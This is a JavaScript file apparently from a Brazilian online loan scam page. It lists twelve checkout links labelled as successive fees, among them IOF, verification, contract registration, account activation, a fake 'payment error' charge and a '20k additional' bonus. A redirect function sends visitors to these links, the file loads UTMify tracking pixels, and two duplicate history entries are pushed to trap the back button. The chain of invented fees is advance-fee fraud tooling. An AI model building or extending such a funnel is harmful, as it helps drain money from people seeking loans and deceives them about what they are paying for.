const baseLinks = {
    up1: "https://pay.chckout.space/2wq7Gr7XvoEgBAN", // IOF
    up2: "https://pay.chckout.space/6YQPgjnXvbegpxz", // Taxa de verificação de IOF
    up3: "https://pay.chckout.space/5pjw3RnlrJy32lQ", // Seguro Prestamista "tarifa de cadastro"
    up4: "https://pay.chckout.space/521rZJzWm4bZeaX", // NFe
    up5: "https://pay.chckout.space/1VOvGV4AVmd3D62", // Ativar conta
    up6: "https://pay.chckout.space/P5LNZ8z16WOgaRy", // Taxa de registro do contrato
    up7: "https://pay.chckout.space/JqoR32bd0Vq3Vj5", // Parabéns, 20k adicional
    up8: "https://pay.chckout.space/nWrxGWAn8XO3654", // Erro no pagamento - 14,06
    up9: "https://pay.chckout.space/lDW0ZaJXlLRGN7E", // APP - 11,99
    up10:"https://pay.chckout.space/KV603koXvYb3w8y", // Taxa de Abertura TAC - 16,92
    up11:"https://pay.chckout.space/a6pVgd2XOo5Zk7B",// Taxa de Consultoria Financeira - 19,53
    up12:"https://pay.chckout.space/PVYB34eDOJvZKzk" // Taxa de Processamento Administrativo - 31,92

};

function redirect(key) {
    try {
        if (!baseLinks[key]) {
            throw new Error(`Link para ${key} não encontrado!`);
        }

        const url = new URL(baseLinks[key]);
        url.search = new URLSearchParams(window.location.search).toString();

        window.location.href = url.href;
        
    } catch (error) {
        console.error('Erro no redirecionamento:', error);
        alert(`Erro: ${error.message || "Não foi possível redirecionar"}`);
    }
}



// UTMIFY, troque o pixel só aqui, belê?
(function() {
 window.googlePixelId = "68cf86530ee8895acecf4b7b";
  var a = document.createElement("script");
  a.setAttribute("async", "");
  a.setAttribute("defer", "");
  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-google.js");
  document.head.appendChild(a);
})();


(function() {
    const script = document.createElement('script');
    
    script.src = 'https://cdn.utmify.com.br/scripts/utms/latest.js';
    script.setAttribute('data-utmify-prevent-xcod-sck', '');
    script.setAttribute('data-utmify-prevent-subids', '');
    script.async = true;
    script.defer = true;

    document.head.appendChild(script);
})();


// Adiciona duas entradas no histórico para capturar a navegação para trás
history.pushState({}, '', location.href);

history.pushState({}, '', location.href);
